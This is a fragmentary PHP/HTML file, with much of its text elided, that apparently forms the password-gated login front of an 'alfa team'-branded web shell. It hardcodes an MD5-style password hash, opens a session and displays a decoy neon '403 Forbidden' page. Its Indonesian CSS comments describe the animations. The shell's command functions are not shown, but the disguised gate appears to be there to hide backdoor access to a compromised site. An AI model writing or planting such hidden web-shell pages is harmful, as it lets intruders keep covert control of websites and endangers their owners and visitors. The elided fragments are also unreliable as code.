<?php
session_start();
$password = "884190a0ce905066397dc49e38bf23be";
  ...
  <style>
    ...
    * {
    ...
    body::before {
      ...
      width: 100%;
      height: 100%;
      background: url("https://i.gyazo.com/841e01d5bd5272a815a8f360b1cddd06.jpg"), #000;
    ...
    .message {
      ...
      text-shadow: 0 0 5px #ff00de, 
                   ...
                   0 0 20px #ff00de, 
                   0 0 40px #ff00de;
      animation: neonRainbow 5s linear infinite, float 3s ease-in-out infinite;
    }

    /* Efek neon berganti warna pelangi */
    @keyframes neonRainbow {
      0%   { text-shadow: 0 0 10px red, 0 0 20px red, 0 0 40px red; color: #ffcccc; }
      25%  { text-shadow: 0 0 10px orange, 0 0 20px orange, 0 0 40px orange; color: #ffe0b3; }
      50%  { text-shadow: 0 0 10px lime, 0 0 20px lime, 0 0 40px lime; color: #e0ffc2; }
      75%  { text-shadow: 0 0 10px cyan, 0 0 20px cyan, 0 0 40px cyan; color: #c2f9ff; }
      100% { text-shadow: 0 0 10px magenta, 0 0 20px magenta, 0 0 40px magenta; color: #ffd6ff; }
    }

    /* Efek teks bergerak naik turun */
    @keyframes float {
...
<body>
  <!-- Pesan default -->
  <div class="message" id="msg">403 Forbidden</div>
...
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://i.gyazo.com/0bddfc9485eee8dae60cbb7be7ea2831.png" /></center>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://i.gyazo.com/0bddfc9485eee8dae60cbb7be7ea2831.png" /></td>
</tr>
<tr>
